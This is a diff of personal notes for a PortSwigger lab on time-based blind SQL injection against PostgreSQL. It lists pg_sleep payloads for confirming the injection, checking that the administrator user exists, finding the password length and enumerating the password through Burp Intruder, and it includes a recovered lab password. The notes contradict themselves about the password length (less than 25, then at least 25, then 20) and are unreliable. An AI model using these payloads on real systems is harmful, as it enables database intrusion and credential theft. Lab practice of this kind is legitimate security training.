@@ -62,15 +62,15 @@ Lab: Blind SQL injection with time delays:
 
 
 
-Lab: Blind SQL injection with time delays and information retrieval
 Lab Source 2: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
+
 
 Target: To solve the lab, log in as the administrator user. 
         Password of administrator than Login
 
 Step-1
     ' || pg_sleep(10)--
-    Result:
+    Result: this query is true
 
 Step-2
     if users table is does { 
@@ -79,24 +79,27 @@ Step-2
     else if users table is doesn't { 
          dont sleep
     }
-    True??
+    True?? Yes
     ' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)--
 
-    False??
-    ' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)--
+    False?? Yes
+    ' || (select case when (1=2) then pg_sleep(10) else pg_sleep(-1) end)--
 
 
     ' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--
+    Result = administrator username is exist
 
 Step-3 
-    Enumerate the Password length
-    True?
+    Enumerate the Password length  xxxx  xxxxx xxxx???
+
     ' || (select case when (username='administrator' and LENGTH(password)>1) then pg_sleep(10) else pg_sleep(-1) end from users)--
+    So is delay => password lenght is more than 1
 
-    True?
     ' || (select case when (username='administrator' and LENGTH(password)>25) then pg_sleep(10) else pg_sleep(-1) end from users)--
+    So is delay => password lenght is less than 25
 
-    Result:
+
+    Result: password lenght >= 25 
 
 Step-4
     Send Result length password to Intruder
@@ -109,19 +112,26 @@ Step-6
     Start attack
     This is can a get some time
 
-    Result: length is ? Characters.
+    Result: length is 20 Characters.
 
 
 Step-7
     Enumerate the administrator password
-    ' || (select case when (username='administrator' and substring(password,1,1='a')) then pg_sleep(5) else pg_sleep(-1) end from users)--
+    '%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+    '%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+
 
 Step-8
     Send step before to Intruder
+    
+    '%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+
+    2fd2pzgrjq3aa58gh16p
 
 Step-9
     Check Resource Pool is mark "Custom resource pool 1"
     Result: is it good query to get password ?
+
 
 Step-10
     Send to Intruder
@@ -148,26 +158,6 @@ Step-15
 
 Step-16
     Login with that
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
